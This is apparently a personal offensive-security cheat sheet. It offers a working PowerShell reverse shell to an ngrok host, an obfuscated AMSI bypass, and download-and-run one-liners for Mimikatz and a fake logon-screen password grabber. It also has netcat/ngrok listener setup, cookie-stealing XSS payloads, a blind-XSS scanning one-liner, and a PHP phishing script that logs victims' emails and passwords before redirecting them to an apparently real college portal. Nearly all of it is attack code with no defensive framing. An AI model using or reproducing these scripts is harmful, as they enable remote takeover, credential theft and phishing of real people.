# windows Rerverse shell
```php
$cthulhu = New-Object System.Net.Sockets.TCPClient('0.tcp.ngrok.io',19021 );$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|% {0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0) {;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2 = $ex + 'CF ' + (pwd).Path + '> '; $shog =([text.encoding]::ASCII).GetBytes($ex2);$tntcl.write($shog,0,$shog.Length); $tntcl.Flush()};

```
------------------------------------------------------

# AMSI BYPASS

```php
$forsec = 'System.Management.Automation.A';$yfd = 'si';$ted = 'Ut' + 'ils'
$astute = [Ref].Assembly.GEtTYpe(('{0}m{1}{2}' -f $forsec,$yfd,$ted))
$onlysecthings =$astute.Getfield(('am{0}InitFailed' -f $yfd),'NonPu' + 'blic' + ',St' + 'atic')
$onlysecthings.SetVALuE($null,$true)
```
------------------------------------------------------------

# invoke pattern to download into memory 
```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
```
# invoke important ps1 github

**MIMIKATZ**

```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
```
**LOGIN SCREEN PASSWORD GRABBER**

```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-FakeLogonScreen.ps1')
```

-----------------------------------------------------------------------------------------------

    ngrok TCP PORT for rev listening 

    ngrok http for http service forwarding 


---------------------------------------------------------------------------------------------------

    ngrok tcp 1234
    nc -nvlp 1234

------------------------------------------------------------------------------------------------------

    tmate 

------------------------------------------------------------------------------------------------

# XSS Paylaods

```html
t3_u9po1l%2520onmouseover=alert(document.domain)%2520y=/t1_i5sxroa

javascript:alert(document.cookie)

"><img src=x onerror=prompt(document.cookie);> 

"><img src=x onerror=alert(1)>

<h1>Testing TG</h1>

flkdflkjslkf"><img%20src=x%20onmouseover=confirm(1)>

<svg onload="javascript:window.onerror=confirm;throw 10">
    
<scr<h1>ipt>document.write("<img src=x onerror=confirm(1);>");</scr<h1>ipt>

<svg/onload=alert(1)>
    
```

#alert in window 

    Add-Type -AssemblyName PresentationCore,PresentationFramework

`for alert`

    [System.Windows.MessageBox]::Show($Messageboxbody,$MessageboxTitle,$ButtonType,$messageicon)

# 1linerXSS

    gospider -S subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox -b astutehacker.xss.ht pipe -o result3.txt

#phishing 
make proccess.php and give process.php to action=/process.php
content of process.php
```
<?php
if(isset($_POST['email']) && isset($_POST['password'])) {
    $password = file_get_contents('phishing.txt');
    $phishing = fopen("phishing.txt", "a");
    fwrite($phishing, $password."email: ".$_POST['email']." Password: ".$_POST['password']."\n");
    fclose($phishing);
    echo '<script>window.location.href="https://su.icloudems.com/corecampus/index.php" </script>';
} else {
    echo '<script>window.location.href="index.html"</script>';
}
?>

`"><SVG ONLOAD%3d%26%2397%26%23108%26%23101%26%23114%26%23116(%26%23x64%26%23x6f%26%23x63%26%23x75%26%23x6d%26%23x65%26%23x6e%26%23x74%26%23x2e%26%23x63%26%23x6f%26%23x6f%26%23x6b%26%23x69%26%23x65%26%23x29>`
```
